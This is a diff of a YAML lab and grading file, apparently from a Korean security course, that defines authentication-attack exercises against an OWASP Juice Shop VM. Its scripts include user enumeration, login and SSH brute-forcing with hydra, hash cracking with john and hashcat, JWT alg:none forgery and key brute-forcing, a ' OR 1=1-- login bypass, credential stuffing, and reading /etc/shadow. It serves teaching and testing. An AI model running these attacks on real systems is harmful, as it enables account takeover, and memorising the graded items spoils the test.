@@ -29,20 +29,20 @@ steps:
     expect: '@'
     field: stdout
     semantic:
-      intent: 인증 공격 (Authentication Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JuiceShop /api/Users 에서 이메일 목록 수집 — 인증 공격 준비 단계로 유효한 공격 대상(username) 확보
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - curl -s /api/Users 응답 수신
+      - JSON 의 data 배열에서 email 필드만 추출
+      - 파일(/tmp/users.txt) 저장 후 @ 포함 이메일 최소 1개 확인
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl + python json parse + print email
+      - curl + jq -r .data[].email
+      - Burp 응답 저장 후 정규식 추출
+      - python requests.get(url).json()
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(인증 공격 (Authentication Attacks))와 무관한 기법
+      - /api/Users 가 아닌 다른 엔드포인트 조회
+      - 이메일 추출 없이 전체 JSON 만
+      - 공격 대상 목록의 용도 설명 없음
   target_vm: attacker
   script: curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json; [print(u['email'])
     for u in json.load(sys.stdin)['data']]" > /tmp/users.txt && cat /tmp/users.txt
@@ -67,20 +67,21 @@ steps:
     expect: Trying
     field: stdout
     semantic:
-      intent: 인증 공격 (Authentication Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JuiceShop 로그인 API 수동 브루트포스 — admin@juice-sh.op 계정에 흔한 비밀번호(admin/admin123/password) 여러개
+        시도
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - for 루프로 5개 이상 비밀번호 시도
+      - '각 시도 결과를 Trying: <pw> -> SUCCESS/FAIL 형식으로 출력'
+      - 응답 JSON 의 authentication 키 존재 여부로 성공 판정
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - bash for 루프 + curl POST + python json 파싱
+      - hydra -l email -P passwords.txt http-post-form
+      - Burp Intruder sniper 모드
+      - patator http_fuzz
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(인증 공격 (Authentication Attacks))와 무관한 기법
+      - 비밀번호 1-2개만 시도
+      - 응답 해석 없이 로그만 출력
+      - rate limiting/계정 잠금 방어 언급 없음
   target_vm: attacker
   script: 'for pw in admin admin123 password 12345 admin1234; do echo -n "Trying: $pw -> "; curl -s -X
     POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$pw\"}"
@@ -106,20 +107,20 @@ steps:
     expect: hydra
     field: stdout
     semantic:
-      intent: 인증 공격 (Authentication Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: hydra SSH 브루트포스 — top100 wordlist 로 web VM 의 22 포트 SSH 로그인 시도 (-t 4 -f 로 첫 성공 시 중단)
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - hydra -l web -P <wordlist> ssh://<IP> 실행
+      - hydra 출력에 [DATA], [ATTEMPT], [STATUS] 라인 포함
+      - SSH rate limiting 때문에 느림을 설명
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - hydra -l <user> -P <wordlist> ssh://<IP> -t 4 -f
+      - medusa -u <user> -P <wordlist> -M ssh -h <IP>
+      - patator ssh_login
+      - ncrack --user <user> -P <wordlist> ssh://<IP>
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(인증 공격 (Authentication Attacks))와 무관한 기법
+      - wordlist 지정 없이 단일 비밀번호
+      - 프로토콜 잘못 (http 로 SSH 공격)
+      - 계정 잠금·rate limit 언급 없음
   target_vm: attacker
   script: head -100 /usr/share/wordlists/rockyou.txt > /tmp/top100.txt 2>/dev/null; hydra -l web -P /tmp/top100.txt
     ssh://10.20.30.80 -t 4 -f
@@ -143,20 +144,20 @@ steps:
     expect: admin123
     field: stdout
     semantic:
-      intent: 인증 공격 (Authentication Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: John the Ripper 오프라인 MD5 크래킹 — echo | md5sum 으로 해시 생성 후 rockyou wordlist 로 원문 복원
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - md5sum 으로 admin123 해시 생성 (/tmp/hash.txt 저장)
+      - john --format=raw-md5 --wordlist=rockyou.txt 실행
+      - john --show 출력에서 admin123 복원 확인
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - echo -n admin123 | md5sum > hash.txt; john --format=raw-md5 --wordlist=... hash.txt; john --show
+      - hashcat -m 0 -a 0 hash.txt wordlist
+      - rainbow table 조회(crackstation)
+      - python hashlib.md5(pwd).hexdigest() 비교 반복
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(인증 공격 (Authentication Attacks))와 무관한 기법
+      - 해시 없이 john 실행
+      - --format 미지정
+      - 결과 복원 확인 없이 종료
   target_vm: attacker
   script: echo -n 'admin123' | md5sum | awk '{print $1}' > /tmp/hash.txt && john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
     /tmp/hash.txt 2>/dev/null; john --format=raw-md5 --show /tmp/hash.txt
@@ -182,20 +183,21 @@ steps:
     expect: 'Answer:'
     field: stdout
     semantic:
-      intent: 인증 공격 (Authentication Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JuiceShop /rest/user/reset-password 보안 질문 답변 브루트포스 — admin 계정의 보안 질문(예 pet name) 답변 후보 여러개
+        시도해 비번 재설정
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - for 루프로 4개 이상 답변 후보 시도
+      - '각 시도 결과를 Answer: <val> -> 응답 형식으로 출력'
+      - OSINT 로 답변 추측 가능함(SNS 프로필) 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - bash for + curl -X POST reset-password
+      - Burp Intruder sniper on answer field
+      - python requests.post 반복
+      - ffuf -d {email,answer,new,repeat} -w answers.txt
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(인증 공격 (Authentication Attacks))와 무관한 기법
+      - 답변 1-2개만 시도
+      - 보안 질문 취약점 원리 설명 없음
+      - OSINT 활용 맥락 언급 없음
   target_vm: attacker
   script: 'for ans in ''replicator'' ''Mr. Robot'' ''Jim'' ''Samuel''; do echo -n "Answer: $ans -> ";
     curl -s -X POST http://10.20.30.80:3000/rest/user/reset-password -H ''Content-Type: application/json''
@@ -221,20 +223,21 @@ steps:
     expect: none
     field: stdout
     semantic:
-      intent: 인증 공격 (Authentication Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JWT alg:none 공격 — Header 의 alg 를 none 으로 변경하고 signature 부분을 제거해 임의 payload(admin role) 로
+        위조 토큰 생성
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - python3 으로 {typ:JWT, alg:none} Base64URL 인코딩된 header 생성
+      - 임의 payload(id, email, role:admin) Base64URL 인코딩
+      - 최종 <header>.<payload>. 형식(dot 포함 signature 빈) 토큰 출력
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - python3 base64.urlsafe_b64encode + strip padding
+      - jwt_tool -X a none <token>
+      - Burp JWT Editor extension
+      - 수동 base64 + 문자열 조합
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(인증 공격 (Authentication Attacks))와 무관한 기법
+      - 알고리즘 변경 없이 payload 만 변조
+      - signature 부분 유지 (none 원리 위배)
+      - padding 보정 없어 디코딩 실패
   target_vm: attacker
   script: python3 -c "import base64,json; h=base64.urlsafe_b64encode(json.dumps({'typ':'JWT','alg':'none'}).encode()).rstrip(b'=').decode();
     p=base64.urlsafe_b64encode(json.dumps({'status':'success','data':{'id':1,'email':'admin@juice-sh.op','role':'admin'},'iat':1700000000}).encode()).rstrip(b'=').decode();
@@ -258,20 +261,21 @@ steps:
     expect: 'Hash:'
     field: stdout
     semantic:
-      intent: 인증 공격 (Authentication Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: hashcat SHA-256 크래킹(-m 1400) — password 의 sha256 해시 생성 후 rockyou wordlist 로 원문 복원, GPU 가속
+        장점 설명
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - sha256sum 으로 해시 생성 후 파일 저장
+      - hashcat -m 1400 -a 0 <hash> <wordlist> 실행
+      - 'hashcat 또는 --show 출력에 복원된 password 문자열 또는 Hash: prefix 로 해시 재출력'
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - echo -n password | sha256sum > hash.txt; hashcat -m 1400 hash.txt rockyou.txt --force
+      - john --format=raw-sha256 대체
+      - python hashlib 기반 수동 비교 반복
+      - crackstation 온라인 테이블 조회
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(인증 공격 (Authentication Attacks))와 무관한 기법
+      - -m 0 (MD5) 등 틀린 모드
+      - wordlist 미지정
+      - 복원 결과 확인 없이 종료
   target_vm: attacker
   script: 'echo -n ''password'' | sha256sum | awk ''{print $1}'' > /tmp/sha256.txt && hashcat -m 1400
     /tmp/sha256.txt /usr/share/wordlists/rockyou.txt --force 2>/dev/null | tail -5; echo ''Hash: ''$(cat
@@ -298,20 +302,21 @@ steps:
     expect: 'Key:'
     field: stdout
     semantic:
-      intent: 인증 공격 (Authentication Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JWT HMAC 약한 secret 키 브루트포스 — header+payload 와 signature 를 후보 키들(secret/1234/password) 로
+        HMAC-SHA256 재계산 후 일치 여부 비교
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - 기존 JWT 에서 header.payload 와 signature 분리
+      - 5개 이상 secret 후보로 HMAC-SHA256 계산 + 원 signature 와 비교
+      - 'Key: <val> -> Match: True/False 형식 출력'
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - python hmac.new + hashlib.sha256 + base64.urlsafe_b64encode 비교
+      - jwt_tool -C -d <wordlist> -t <token>
+      - hashcat -m 16500 jwt.txt wordlist (JWT mode)
+      - john --format=hmac-sha256 대체
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(인증 공격 (Authentication Attacks))와 무관한 기법
+      - 키 1-2개만 시도
+      - signature 비교 누락
+      - 약한 키 위험성 언급 없음
   target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
     -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
@@ -338,20 +343,20 @@ steps:
     - ED25519
     field: stdout
     semantic:
-      intent: 인증 공격 (Authentication Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: ssh-keygen ED25519 키쌍 생성 — 비밀번호 브루트포스 면역의 키 기반 인증 설명 + 공개키 출력·지문 확인
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - ssh-keygen -t ed25519 -f <path> -N "" -q 실행
+      - <path>.pub 공개키 출력 (ssh-ed25519 ...)
+      - ssh-keygen -lf 로 key fingerprint 표시
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - ssh-keygen -t ed25519 -f /tmp/test_key -N \"\" -q
+      - ssh-keygen -t rsa -b 4096 (RSA 대체)
+      - python cryptography Ed25519PrivateKey.generate
+      - openssl genpkey -algorithm ED25519
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(인증 공격 (Authentication Attacks))와 무관한 기법
+      - 비밀번호 인증 설명만
+      - ED25519 대신 약한 DSA 생성
+      - 공개키·지문 확인 단계 생략
   target_vm: attacker
   script: ssh-keygen -t ed25519 -f /tmp/test_key -N '' -q && echo 'Public Key:' && cat /tmp/test_key.pub
     && echo 'Key fingerprint:' && ssh-keygen -lf /tmp/test_key
@@ -376,20 +381,21 @@ steps:
     expect: ->
     field: stdout
     semantic:
-      intent: 인증 공격 (Authentication Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: Credential Stuffing 시뮬레이션 — 이메일:비번 조합 파일(/tmp/creds.txt)을 while read 루프로 JuiceShop 로그인 API
+        에 자동 시도
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - creds.txt 에 4개 이상 email:password 조합 저장
+      - 'while IFS=: read 로 반복 로그인 시도'
+      - 각 시도 결과 <email> -> SUCCESS/FAIL 출력
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - while read 루프 + curl + python json 파싱
+      - hydra -C user_pass_file http-post-form
+      - ffuf -w creds.txt:EMAIL:PASS -d ...
+      - python requests 로 스크립트
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(인증 공격 (Authentication Attacks))와 무관한 기법
+      - 단일 계정 반복 (Credential Stuffing 아님, 브루트포스)
+      - 성공/실패 판정 없음
+      - 비번 재사용 문제 언급 없음
   target_vm: attacker
   script: 'echo -e ''admin@juice-sh.op:admin123\njim@juice-sh.op:ncc-1701\nbender@juice-sh.op:bender\nmc.safesearch@juice-sh.op:Mr.
     N00dles'' > /tmp/creds.txt && while IFS=: read -r email pw; do echo -n "$email -> "; curl -s -X POST
@@ -415,20 +421,21 @@ steps:
     expect: 'User:'
     field: stdout
     semantic:
-      intent: 인증 공격 (Authentication Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: /etc/shadow 해시 형식 분석 — $id$salt$hash 구조에서 id 값으로 알고리즘(1=MD5/5=SHA256/6=SHA512/y=yescrypt)
+        식별
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - sudo cat /etc/shadow 로 해시 라인 조회 (잠긴 ! 와 없는 * 제외)
+      - $ 구분자로 id 추출 및 User:<user>, Algorithm:<id> 형식 출력
+      - id→알고리즘 매핑(1/5/6/y) 설명
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - sudo cat /etc/shadow + cut -d:/cut -d$ 조합
+      - 'awk -F: 로 사용자/해시 분리'
+      - python /etc/shadow 파싱 + 정규식
+      - getent shadow 대체
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(인증 공격 (Authentication Attacks))와 무관한 기법
+      - sudo 없이 읽기 실패
+      - id 추출 없이 원본 해시만 출력
+      - yescrypt/SHA512 등 현대 알고리즘 언급 없음
   target_vm: attacker
   script: 'sudo cat /etc/shadow | grep -v ''!'' | grep -v ''*'' | head -5 | while read line; do user=$(echo
     $line | cut -d: -f1); hash=$(echo $line | cut -d: -f2); algo=$(echo $hash | cut -d''$'' -f2); echo
@@ -450,20 +457,20 @@ steps:
     expect: NTLM hash
     field: stdout
     semantic:
-      intent: 인증 공격 (Authentication Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: NTLM 해시 계산 — MD4(UTF-16LE(password)) 로 Windows 인증용 해시 생성, Pass-the-Hash 공격 원리 이해
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - python3 hashlib.new(md4, <password>.encode(utf-16-le)).hexdigest() 실행
+      - '출력에 NTLM hash: 라벨과 32 hex 문자열'
+      - Pass-the-Hash 공격 맥락(Windows 도메인 위험) 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - python3 hashlib.new md4 + utf-16-le encode
+      - impacket-nt-hash helper
+      - openssl md4 (utf-16 변환 후)
+      - pypykatz/mimikatz 로 기존 해시 덤프
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(인증 공격 (Authentication Attacks))와 무관한 기법
+      - MD5/SHA 해시로 오해
+      - UTF-16LE 대신 UTF-8 인코딩
+      - Pass-the-Hash 맥락 설명 없음
   target_vm: attacker
   script: python3 -c "import hashlib; print('NTLM hash of password:', hashlib.new('md4', 'password'.encode('utf-16-le')).hexdigest())"
   risk_level: low
@@ -484,20 +491,20 @@ steps:
     expect: question
     field: stdout
     semantic:
-      intent: 인증 공격 (Authentication Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JuiceShop /rest/user/security-question?email= 로 특정 계정의 보안 질문 조회 — PW 재설정 공격 사전 정보
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - curl -G --data-urlencode email=<target> <url>/rest/user/security-question
+      - JSON 응답에 question 필드 포함된 객체
+      - 보안 질문 기반 PW 재설정의 취약성(답변 추측) 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl -s <url>/rest/user/security-question?email=<target>
+      - Burp Repeater 로 email 변경
+      - python requests.get(params={email})
+      - OSINT 로 답변 추측(SNS 프로필)
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(인증 공격 (Authentication Attacks))와 무관한 기법
+      - 다른 엔드포인트 조회
+      - question 필드 해석 없이 종료
+      - PW 재설정 공격 맥락 언급 없음
   target_vm: attacker
   script: curl -s 'http://10.20.30.80:3000/rest/user/security-question?email=admin@juice-sh.op' | python3
     -m json.tool
@@ -520,20 +527,21 @@ steps:
     expect: Attempt 10
     field: stdout
     semantic:
-      intent: 인증 공격 (Authentication Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: Rate Limiting 부재 검증 — for 루프로 10회 잘못된 비번 로그인 후 HTTP 상태 코드(401 유지 vs 429/403) 확인, 계정 잠금 여부
+        판단
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - for 루프로 10회 시도
+      - '각 시도의 HTTP 상태 코드 Attempt <N>: HTTP <code> 형식 출력'
+      - 10회 모두 401 = rate limit 없음 / 429·403 = 방어 동작 판정
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - for i in {1..10}; do curl -o /dev/null -w %{http_code}; done
+      - Burp Intruder sniper 로 100회 시도
+      - hydra 로 스피드 테스트
+      - python requests 반복
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(인증 공격 (Authentication Attacks))와 무관한 기법
+      - 3회 이하 시도
+      - 상태 코드 변화 해석 없음
+      - OWASP 권장(5-10회 후 잠금) 언급 없음
   target_vm: attacker
   script: "for i in $(seq 1 10); do STATUS=$(curl -s -o /dev/null -w '%{http_code}' \\\n     -X POST http://10.20.30.80:3000/rest/user/login\
     \ \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"email\":\"admin@juice-sh.op\",\"password\"\
@@ -561,20 +569,21 @@ steps:
     expect: Authentication Attack Report
     field: stdout
     semantic:
-      intent: 인증 공격 (Authentication Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 인증 공격 결과 리포트 — 침해 계정·취약점(rate limit 부재·약한 PW·보안 질문·JWT 약한 키·user enum)·대응 방안(MFA·강한 정책)
+        을 /tmp/auth_attack_report.txt 로 정리
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - '[Compromised Accounts] [Vulnerabilities] [Recommendations] 3 섹션 이상 포함'
+      - 발견 취약점 최소 4개 + 각 대응 권고
+      - 파일 저장 후 cat 으로 검증
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - heredoc > /tmp/auth_attack_report.txt
+      - echo -e 다줄
+      - python jinja2 markdown
+      - dradis 리포트 도구
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(인증 공격 (Authentication Attacks))와 무관한 기법
+      - 섹션 2 미만
+      - 파일 저장 없음
+      - 대응 방안 일반론만 (구체 권고 없음)
   target_vm: attacker
   script: 'echo -e ''=== Authentication Attack Report ===\n\n[Compromised Accounts]\n- admin@juice-sh.op:
     SQL Injection bypass\n- Multiple accounts: credential stuffing\n\n[Vulnerabilities]\n1. No rate limiting
